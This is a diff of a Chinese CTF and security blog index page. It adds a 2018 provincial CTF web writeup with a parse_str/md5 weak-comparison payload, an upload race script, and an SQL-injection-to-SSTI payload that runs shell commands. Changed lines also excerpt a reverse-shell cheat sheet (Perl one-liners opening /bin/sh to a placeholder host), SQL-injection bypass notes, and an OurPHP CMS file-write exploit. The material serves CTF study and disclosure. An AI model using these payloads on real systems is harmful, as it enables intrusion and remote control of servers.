@@ -247,6 +247,158 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/05/2018科来杯山东省省赛Web Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/11/05/2018科来杯山东省省赛Web Writeup/" itemprop="url">
+                  2018科来杯山东省省赛Web Writeup
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-05T00:00:00+08:00">
+                2018-11-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/11/05/2018科来杯山东省省赛Web Writeup/" class="leancloud_visitors" data-flag-title="2018科来杯山东省省赛Web Writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="babyWeb"><a href="#babyWeb" class="headerlink" title="babyWeb"></a>babyWeb</h3><p>web签到题</p>
+<p>ip不在允许范围，修改header头的client-ip为<code>127.0.0.1</code></p>
+<p>你不是管理员，修改cookie中的admin值为1即可。</p>
+<h3 id="babyWeb2"><a href="#babyWeb2" class="headerlink" title="babyWeb2"></a>babyWeb2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">   <span class="keyword">include</span> <span class="string">'here.php'</span>;</div><div class="line">   $key = <span class="string">'kelaibei'</span>;</div><div class="line"></div><div class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</div><div class="line">       $id = $_GET[<span class="string">'id'</span>];</div><div class="line">       @parse_str($id);</div><div class="line">       <span class="keyword">if</span> ($key[<span class="number">99</span>] != <span class="string">'aabg7XSs'</span> &amp;&amp; md5($key[<span class="number">99</span>]) == md5(<span class="string">'aabg7XSs'</span>)) &#123;</div><div class="line">          <span class="keyword">echo</span> $hint;</div><div class="line">       &#125;</div><div class="line">       <span class="keyword">else</span>&#123;</div><div class="line">           <span class="keyword">echo</span> <span class="string">'try again'</span>;</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">else</span>&#123;</div><div class="line">       show_source(<span class="keyword">__FILE__</span>);</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
+<p>parse_str()函数存在变量覆盖，可以覆盖变量<code>key[99]</code></p>
+<p>aabg7XSs的md5值为<code>0e087386482136013740957780965295</code>，而且用了双等号，存在弱类型</p>
+<p>payload:<code>id=key[99]=s878926199a</code></p>
+<p>到<code>upl04d50m3thing.php</code>页面</p>
+<p>可以上传文件，但是会修改文件内容为too slow，而且上传时有一定的延时，猜测在延迟时访问上传的文件可以访问到。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</div><div class="line">    url = <span class="string">'http://x.x.x.x/uploads/5761c4916bc4034ebbaea308db0d350137f0778b/w1test.php'</span></div><div class="line">    r = requests.get(url).content</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">'slow'</span> <span class="keyword">in</span> r:</div><div class="line">        <span class="keyword">print</span> r</div></pre></td></tr></table></figure>
+<p>运行脚本，用burp重放上传的数据包即可拿到flag。</p>
+<h3 id="Easy-flask"><a href="#Easy-flask" class="headerlink" title="Easy_flask"></a>Easy_flask</h3><p>题目提供了Add a Comment和Search Comment两个功能</p>
+<p>尝试ssti，<code>username=&#39;test&#39;&amp;comment=</code>，搜索test</p>
+<p><img src="https://github.com/Windylh/image/raw/master/2018.11.5/web3-1.png" alt=""></p>
+<p>存在ssti，但是Add a Comment中username和comment两个参数限制了字符长度，最多提交10个字符，没法运用ssti。</p>
+<p>测试search功能，username参数存在sql注入,payload:<code>username=test&#39; union select 1,2,3 -- wtest</code></p>
+<p><img src="https://github.com/Windylh/image/raw/master/2018.11.5/web3-2.png" alt=""></p>
+<p>构造union注入的参数进行ssti,payload:<code>username=test&#39; union select 1,2,&quot;&quot; -- wtest</code></p>
+<p><img src="https://github.com/Windylh/image/raw/master/2018.11.5/web3-3.png" alt=""></p>
+<p>通过基础类的方式构造payload，payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=test&apos; union select 1,2,&quot;&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;cat /flag&apos;).read()&#125;&#125;&quot; -- wtest</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/Windylh/image/raw/master/2018.11.5/web3-4.png" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/09/反弹shell小结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -334,8 +486,8 @@
 
       
         
-          <h3 id="攻击机监听"><a href="#攻击机监听" class="headerlink" title="攻击机监听"></a>攻击机监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvvp 7777</div></pre></td></tr></table></figure>
-<h3 id="靶机远程反弹shell"><a href="#靶机远程反弹shell" class="headerlink" title="靶机远程反弹shell"></a>靶机远程反弹shell</h3><h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use Socket;$i="x.x.x.x";$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></div><div class="line"></div><div class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:xxxx");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></div></pre></td></tr></table></figure>
+          <h3 id="攻击机监听"><a href="#攻击机监听" class="headerlink" title="攻击机监听"></a>攻击机监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure>
+<h3 id="靶机远程反弹shell"><a href="#靶机远程反弹shell" class="headerlink" title="靶机远程反弹shell"></a>靶机远程反弹shell</h3><h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="x.x.x.x";$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br><span class="line"></span><br><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:xxxx");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/09/09/反弹shell小结/#more" rel="contents">
@@ -472,7 +624,7 @@
       
         
           <p>整理一下sql注入的各种绕过姿势，以后做题方便查阅。</p>
-<h3 id="0x00-注释符"><a href="#0x00-注释符" class="headerlink" title="0x00 注释符"></a>0x00 注释符</h3><p>常用注释：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//</div><div class="line">--%20</div><div class="line">/**/</div><div class="line">#</div><div class="line">--+</div><div class="line">-- -</div><div class="line">%00</div><div class="line">;</div></pre></td></tr></table></figure></p>
+<h3 id="0x00-注释符"><a href="#0x00-注释符" class="headerlink" title="0x00 注释符"></a>0x00 注释符</h3><p>常用注释：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">--%20</span><br><span class="line">/**/</span><br><span class="line">#</span><br><span class="line">--+</span><br><span class="line">-- -</span><br><span class="line">%00</span><br><span class="line">;</span><br></pre></td></tr></table></figure></p>
 <h3 id="0x01-大小写绕过"><a href="#0x01-大小写绕过" class="headerlink" title="0x01 大小写绕过"></a>0x01 大小写绕过</h3><p>用于绕过一些对大小写敏感的黑名单匹配</p>
           <!--noindex-->
           <div class="post-button text-center">
@@ -609,7 +761,7 @@
 
       
         
-          <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SandGame"><a href="#SandGame" class="headerlink" title="SandGame"></a>SandGame</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> flag</div><div class="line"></div><div class="line">flag = flag.flag</div><div class="line">sands = int(flag[<span class="number">5</span>:<span class="number">-1</span>].encode(<span class="string">"hex"</span>), <span class="number">16</span>)</div><div class="line"></div><div class="line">holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">"sand.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(holes)):</div><div class="line">        sand = sands % holes[i]</div><div class="line">        f.write(str(sand)+<span class="string">"\n"</span>)</div></pre></td></tr></table></figure>
+          <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="SandGame"><a href="#SandGame" class="headerlink" title="SandGame"></a>SandGame</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag = flag.flag</span><br><span class="line">sands = int(flag[<span class="number">5</span>:<span class="number">-1</span>].encode(<span class="string">"hex"</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">holes = [<span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>, <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>, <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>, <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>, <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"sand.txt"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(holes)):</span><br><span class="line">        sand = sands % holes[i]</span><br><span class="line">        f.write(str(sand)+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/05/29/SUCTF2018部分Writeup/#more" rel="contents">
@@ -887,7 +1039,7 @@
           <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web200"><a href="#Web200" class="headerlink" title="Web200"></a>Web200</h3><p>op参数能读取执行功能的php，尝试用位协议读取源码。</p>
 <p><code>php://filter/read=convert.base64-encode/resource=xxx</code></p>
 <p>得到源码</p>
-<p>home.php<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include 'common.php';</div><div class="line">?&gt;</div><div class="line">&lt;center&gt;</div><div class="line">&lt;div class="article"&gt;</div><div class="line">    &lt;h2&gt;Welcome!!&lt;/h2&gt;</div><div class="line">    &lt;p&gt;</div><div class="line">        We let you upload PNG image files and store it!&lt;br/&gt;</div><div class="line">    &lt;/p&gt;</div><div class="line">    &lt;p&gt;</div><div class="line">        Get started by &lt;a href="?op=upload"&gt;uploading a picture&lt;/a&gt;</div><div class="line">    &lt;/p&gt;</div><div class="line">    </div><div class="line">&lt;/div&gt;</div><div class="line">&lt;/center&gt;</div></pre></td></tr></table></figure></p>
+<p>home.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div class="article"&gt;</span><br><span class="line">    &lt;h2&gt;Welcome!!&lt;/h2&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        We let you upload PNG image files <span class="keyword">and</span> store it!&lt;br/&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        Get started by &lt;a href=<span class="string">"?op=upload"</span>&gt;uploading a picture&lt;/a&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure></p>
 <p>指向common.php<br>
           <!--noindex-->
           <div class="post-button text-center">
@@ -1162,14 +1314,14 @@
       
         
           
-            <h2 id="0x00-Payload"><a href="#0x00-Payload" class="headerlink" title="0x00 Payload"></a>0x00 Payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/client/manage/ourphp_filebox.php?op=save&amp;encode=UTF-8&amp;fename=1.php&amp;ncontent=&lt;?php phpinfo(); ?&gt;</div></pre></td></tr></table></figure>
+            <h2 id="0x00-Payload"><a href="#0x00-Payload" class="headerlink" title="0x00 Payload"></a>0x00 Payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/client/manage/ourphp_filebox.php?op=save&amp;encode=UTF-8&amp;fename=1.php&amp;ncontent=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
 <p>在登陆后台后，可直接上传文件。</p>
 <h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>/ourphp/client/manage/ourphp_filebox.php 694行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($ncontent, $fename, $encode)</span> </span>&#123;</div><div class="line">    <span class="keyword">global</span> $meurl,$folder;</div><div class="line">    <span class="keyword">if</span> (!$fename == <span class="string">""</span>) &#123;</div><div class="line">    maintop(<span class="string">"编辑"</span>);</div><div class="line">    $file = iconv(<span class="string">"UTF-8"</span>, <span class="string">"GBK"</span>, $folder.$fename);</div><div class="line">    $ydata = stripslashes($ncontent);</div><div class="line">    <span class="keyword">if</span>($encode!==<span class="string">"UTF-8"</span> &amp;&amp; $encode!==<span class="string">"ASCII"</span>)&#123;</div><div class="line">        $ydata = iconv($encode, <span class="string">"UTF-8"</span>, $ydata);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(file_put_contents($file, $ydata)) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;div class='box'&gt;文件 &lt;a href=\""</span>.$folder.$fename.<span class="string">"\" target=\"_blank\"&gt;"</span>.$folder.$fename.<span class="string">"&lt;/a&gt; 保存成功！\n"</span></div><div class="line">            .<span class="string">"请选择 &lt;a href=\""</span>.$meurl.<span class="string">"?op=home&amp;folder="</span>.$_SESSION[<span class="string">'folder'</span>].<span class="string">"\"&gt;返回文件管理&lt;/a&gt; 或者 &lt;a href=\""</span>.$meurl.<span class="string">"?op=edit&amp;fename="</span>.$fename.<span class="string">"&amp;folder="</span>.$folder.<span class="string">"\"&gt;继续编辑&lt;/a&gt;&lt;/div&gt;\n"</span>;</div><div class="line">        $fp = <span class="keyword">null</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;span class='error'&gt;文件保存出错！&lt;/span&gt;\n"</span></div><div class="line">        .<span class="string">" &lt;a href=\""</span>.$meurl.<span class="string">"?op=home&amp;folder="</span>.$_SESSION[<span class="string">'folder'</span>].<span class="string">"\"&gt;返回文件管理&lt;/a&gt;\n"</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">    home();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>函数调用位置:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">switch</span> ($op)&#123;</div><div class="line">    ……</div><div class="line">    <span class="keyword">case</span> <span class="string">"save"</span>:</div><div class="line">    save($_REQUEST[<span class="string">'ncontent'</span>], $_REQUEST[<span class="string">'fename'</span>], $_REQUEST[<span class="string">'encode'</span>]);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
-<p>op参数位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'op'</span>]))&#123;</div><div class="line">    $op = $_REQUEST[<span class="string">'op'</span>];</div><div class="line">    session_start();</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">    $op = <span class="string">'home'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($ncontent, $fename, $encode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $meurl,$folder;</span><br><span class="line">    <span class="keyword">if</span> (!$fename == <span class="string">""</span>) &#123;</span><br><span class="line">    maintop(<span class="string">"编辑"</span>);</span><br><span class="line">    $file = iconv(<span class="string">"UTF-8"</span>, <span class="string">"GBK"</span>, $folder.$fename);</span><br><span class="line">    $ydata = stripslashes($ncontent);</span><br><span class="line">    <span class="keyword">if</span>($encode!==<span class="string">"UTF-8"</span> &amp;&amp; $encode!==<span class="string">"ASCII"</span>)&#123;</span><br><span class="line">        $ydata = iconv($encode, <span class="string">"UTF-8"</span>, $ydata);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(file_put_contents($file, $ydata)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;div class='box'&gt;文件 &lt;a href=\""</span>.$folder.$fename.<span class="string">"\" target=\"_blank\"&gt;"</span>.$folder.$fename.<span class="string">"&lt;/a&gt; 保存成功！\n"</span></span><br><span class="line">            .<span class="string">"请选择 &lt;a href=\""</span>.$meurl.<span class="string">"?op=home&amp;folder="</span>.$_SESSION[<span class="string">'folder'</span>].<span class="string">"\"&gt;返回文件管理&lt;/a&gt; 或者 &lt;a href=\""</span>.$meurl.<span class="string">"?op=edit&amp;fename="</span>.$fename.<span class="string">"&amp;folder="</span>.$folder.<span class="string">"\"&gt;继续编辑&lt;/a&gt;&lt;/div&gt;\n"</span>;</span><br><span class="line">        $fp = <span class="keyword">null</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;span class='error'&gt;文件保存出错！&lt;/span&gt;\n"</span></span><br><span class="line">        .<span class="string">" &lt;a href=\""</span>.$meurl.<span class="string">"?op=home&amp;folder="</span>.$_SESSION[<span class="string">'folder'</span>].<span class="string">"\"&gt;返回文件管理&lt;/a&gt;\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    home();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数调用位置:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ($op)&#123;</span><br><span class="line">    ……</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"save"</span>:</span><br><span class="line">    save($_REQUEST[<span class="string">'ncontent'</span>], $_REQUEST[<span class="string">'fename'</span>], $_REQUEST[<span class="string">'encode'</span>]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p>
+<p>op参数位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'op'</span>]))&#123;</span><br><span class="line">    $op = $_REQUEST[<span class="string">'op'</span>];</span><br><span class="line">    session_start();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $op = <span class="string">'home'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>所有参数全部都是request到的，也没有经过过滤函数，就直接拼接到了字符串中，进行了文件读写，保存。</p>
-<p>CNVD-2017-13894是前台漏洞，但是我并没有找到如何绕过验证。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'validation'</span>] == $ourphp[<span class="string">'validation'</span>] &amp;&amp; $_GET[<span class="string">'code'</span>] == $ourphp[<span class="string">'safecode'</span>])&#123;</div><div class="line">    $_SESSION[<span class="string">'ourphp_outtime'</span>] = time() + <span class="number">3600</span>; </div><div class="line">    $_SESSION[<span class="string">'ourphp_out'</span>] = <span class="string">"ourphp"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'ourphp_out'</span>]))&#123;</div><div class="line">            $filefolder = str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,WEB_ROOT.$ourphp[<span class="string">'webpath'</span>]);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">include</span> <span class="string">'ourphp_checkadmin.php'</span>;</div><div class="line">            $filefolder = str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,WEB_ROOT.$ourphp[<span class="string">'webpath'</span>].<span class="string">"templates/"</span>);</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>CNVD-2017-13894是前台漏洞，但是我并没有找到如何绕过验证。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'validation'</span>] == $ourphp[<span class="string">'validation'</span>] &amp;&amp; $_GET[<span class="string">'code'</span>] == $ourphp[<span class="string">'safecode'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'ourphp_outtime'</span>] = time() + <span class="number">3600</span>; </span><br><span class="line">    $_SESSION[<span class="string">'ourphp_out'</span>] = <span class="string">"ourphp"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'ourphp_out'</span>]))&#123;</span><br><span class="line">            $filefolder = str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,WEB_ROOT.$ourphp[<span class="string">'webpath'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">'ourphp_checkadmin.php'</span>;</span><br><span class="line">            $filefolder = str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,WEB_ROOT.$ourphp[<span class="string">'webpath'</span>].<span class="string">"templates/"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>这里验证了validation和safecode，validation是ourphp的口令码，safecode是随机生成的32位的安全码，如果有这两个字符串也可以绕过验证。</p>
 
           
@@ -1301,7 +1453,7 @@
 
       
         
